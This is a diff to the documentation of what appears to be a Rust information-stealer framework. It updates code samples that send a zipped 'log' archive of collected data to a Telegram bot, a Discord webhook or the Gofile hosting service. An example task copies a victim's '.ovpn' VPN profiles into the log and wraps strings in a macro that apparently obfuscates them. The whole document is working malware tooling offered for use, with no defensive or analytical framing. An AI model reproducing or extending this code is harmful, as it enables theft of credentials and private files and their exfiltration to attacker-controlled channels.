@@ -160,7 +160,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     
     // 2. or upload, like call upload_telegram
     //
-    // let _ = upload_telegram(env!("CHAT_ID"), env!("BOT_TOKEN"), zip);
+    // let _ = upload_telegram(env!("CHAT_ID"), env!("BOT_TOKEN"), Arc::from("log.zip"), zip);
   
     0
 }
@@ -173,12 +173,12 @@ use sender::{LogSenderExt, SendError};
 use zip::ZipArchive;
 use sender::telegram_bot::TelegramBot;
 
-pub fn upload_telegram<C>(chat_id: &str, bot: &str, zip: ZipArchive, collector: &C) -> Result<(), SendError>
+pub fn upload_telegram<C>(chat_id: &str, bot: &str, log_filename: Arc<str>, zip: ZipArchive, collector: &C) -> Result<(), SendError>
 where
     C: Collector
 {
     TelegramBot::new(Arc::from(chat_id), Arc::from(bot))
-        .send_archive(zip, collector)
+        .send_archive(log_filename, zip, collector)
 }
 ```
 
@@ -191,7 +191,7 @@ use sender::gofile::Gofile;
 use sender::size_fallback::SizeFallbackSender;
 use zip::ZipArchive;
 
-pub fn upload_discord<C>(webhook: &str, zip: ZipArchive, collector: &C) -> Result<(), SendError>
+pub fn upload_discord<C>(webhook: &str, log_filename: Arc<str>, zip: ZipArchive, collector: &C) -> Result<(), SendError>
 where 
     C: Collector
 {
@@ -199,7 +199,7 @@ where
     let gofile = Gofile::new(discord.clone());
     
     SizeFallbackSender::new(discord, gofile)
-        .send_archive(zip, collector)
+        .send_archive(log_filename, zip, collector)
 }
 ```
 
@@ -277,7 +277,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for ExampleTask {
         }
 
         // copy between filesystems to populate log file content
-        copy_content_with_filter(
+        let _ = copy_content_with_filter(
             // source filesystem
             StorageFileSystem,
             
@@ -295,7 +295,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for ExampleTask {
             &|profile| {
                 profile.extension().map(|ex| ex.contains(s!("ovpn"))).unwrap_or(false)
             }
-        )
+        );
     }
 }
 ```
